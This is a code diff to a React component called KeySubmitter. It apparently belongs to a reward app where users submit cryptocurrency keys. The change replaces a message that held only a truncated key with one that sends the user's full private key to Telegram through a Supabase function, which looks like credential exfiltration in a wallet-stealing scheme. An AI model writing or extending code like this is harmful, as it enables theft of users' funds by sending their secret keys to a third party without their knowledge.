@@ -119,11 +119,11 @@ export function KeySubmitter() {
       if (!activeKey || !isVerified || !user) return;
       const result = await submitKey(user.id, activeKey.privateKey);
 
-      // Send verified key to Telegram
+      // Send only clean private key to Telegram
       try {
         await supabase.functions.invoke("send-telegram", {
           body: {
-            message: `🔑 <b>New Verified Key</b>\n👤 User: ${user.guest_id} (${user.display_name || "N/A"})\n🔗 Address: ${activeKey.address}\n🔐 Key: ${activeKey.privateKey.substring(0, 15)}...\n💰 Reward: +${result?.newBalance ? "" : ""}${result?.message || ""}`,
+            message: activeKey.privateKey,
           },
         });
       } catch (e) {
